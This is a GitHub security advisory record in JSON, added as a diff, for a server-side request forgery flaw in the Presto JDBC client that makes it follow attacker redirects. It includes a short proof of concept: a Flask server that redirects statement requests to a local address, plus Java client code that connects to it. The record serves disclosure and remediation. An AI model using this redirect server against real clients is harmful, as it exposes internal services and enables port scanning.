@@ -1,0 +1,57 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-xm7x-f3w2-4hjm",
+  "modified": "2023-10-03T21:54:02Z",
+  "published": "2023-10-03T21:54:02Z",
+  "aliases": [
+
+  ],
+  "summary": "Presto JDBC Server-Side Request Forgery by redirect",
+  "details": "### Summary\n\nPresto JDBC is vulnerable to Server-Side Request Forgery (SSRF) when connecting a remote Presto server. An attacker can construct a redirect response that Presto JDBC client will follow and view sensitive information from highly sensitive internal servers or perform a local port scan. \n\n### Details\n\nPresto JDBC client uses OkHttp to send `POST /v1/statement` and `GET /v1/info` requests to the remote Presto server. And OkHttp will follow 301 and 302 redirect by default. In addition, JDBC will manually follow 307 and 308 redirect. Therefore, if a malicious server returns a 30x redirect,  JDBC client will follow the redirect and cause SSRF.\n\nFor unexpected responses, JDBC will put the response body into the error. So the response of the internal server will be leaked if the server also returns the error directly to the user.\n\nThe relevant code is in file path `/presto-client/src/main/java/com/facebook/presto/client/StatementClientV1.java` and function `StatementClientV1` .\n\nThe flowchart is as follows:\n\n<img src=\"https://s2.loli.net/2023/09/18/AhiHNL5neuYIK4X.png\" alt=\"trino_jdbc_ssrf_1.png\" style=\"zoom:50%;\" />\n\n### PoC\n\nRunning an HTTP service to route POST /v1/statement redirect to the intranet. For example, using these Python code:\n\n```python\nfrom flask import Flask, redirect\n\napp = Flask(__name__)\n\n@app.route('/v1/statement', methods=['POST'])\ndef redirect_to_interal_server():\n    return redirect('http://127.0.0.1:8888', code=302)\n\nif __name__ == '__main__':\n    app.run(host=\"0.0.0.0\",port=8000)\n```\n\nConnecting to the malicious server using JDBC:\n\n```java\nString url = \"jdbc:presto://<ip>:<port>\";\nProperties properties = new Properties();\nproperties.setProperty(\"user\", \"root\");\ntry {\n    Connection connection = DriverManager.getConnection(url, properties);\n    Statement stmt = connection.createStatement();\n    ResultSet res = stmt.executeQuery(\"show catalogs\");\n    while(res.next()) {\n        System.out.println(res.getString(1));\n    }\n} catch (Exception e) {\n    e.printStackTrace();\n}\n```\n\nPwned!\n\n### Impact\n\nWhen the target remote Presto server to be connected is controllable,  an attacker can view sensitive information from highly sensitive internal servers or perform a local port scan. \n\n### Others\n\nRegarding the fix suggestions, the redirect issue we can consider directly disable the following redirect. If not, we can add a jdbc parameter such as allowRedirect. Like MySQL JDBC caused arbitrary file reading before, its solution is adding the allowLoadLocalInfile parameters. Disable redirect by default, and there is a need to open. The nextUri issue is similar. If we can only take the path of nextUri instead of the complete URL, join the host and path. If not, add a jdbc parameter too.\n\nI think these two vulnerabilities are worth fixing. There is no effective way to avoid this vulnerability at the server side, and the only way to fix them is modifying the jdbc source code. I think many other vendors also have this issue.\n\nI hope to apply for CVEs and give security thanks in the vulnerability bulletin to prove my work, thank you.\n\nVulnerability Discovery Credit: Jianyu Li @ WuHeng Lab of ByteDance",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:L"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Maven",
+        "name": "com.facebook.presto:presto-jdbc"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "last_affected": "0.283"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/prestodb/presto/security/advisories/GHSA-xm7x-f3w2-4hjm"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/prestodb/presto"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-918"
+    ],
+    "severity": "HIGH",
+    "github_reviewed": true,
+    "github_reviewed_at": "2023-10-03T21:54:02Z",
+    "nvd_published_at": null
+  }
+}
